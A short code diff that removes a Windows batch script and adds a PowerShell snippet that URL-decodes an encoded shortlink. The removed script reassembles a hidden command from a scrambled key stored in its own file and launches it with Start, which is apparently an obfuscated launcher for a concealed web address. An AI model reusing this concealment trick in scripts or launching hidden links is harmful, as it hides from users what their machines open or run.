@@ -1,10 +1,6 @@
-@Echo Off
-For /F "Tokens=1,* Delims=ù" %%A in ('Type "%~0" ^| Findstr  "^{eKey}"') Do Set "__Key=%%B"
-Set "Exect="
-SetLocal EnableDelayedExpansion
-For %%` in (33=2=34,18,9,8;63;25,62,26,49;29=60;35;44,53;61;13=58,16=6;30,52=0,37,50=43;31;55;39;14,66,47,11;12,51=64,70;48,22;57=5,17=3=10,59;15;20;46,24;32,65,36=67;54=23=45=38,69,40;21=42,) Do Set "Exect=!Exect!!__Key:~%%`,1!"
-Start !Exect!
-Pause
-Goto :Eof
+#Parameter
+$URL = "https%3A%2F%2Flnkiy%2Ein%2Fdbdwin"
+ 
+#Decode URL
+[System.Web.HttpUtility]::UrlDecode($URL)
 
-{eKey}ùo^tdLoe#:s//BbcbsupKaiCaz/aÜÈ.rnihtinnn.wpnetihmkwtLchmtrluagur/4ao/K/c&
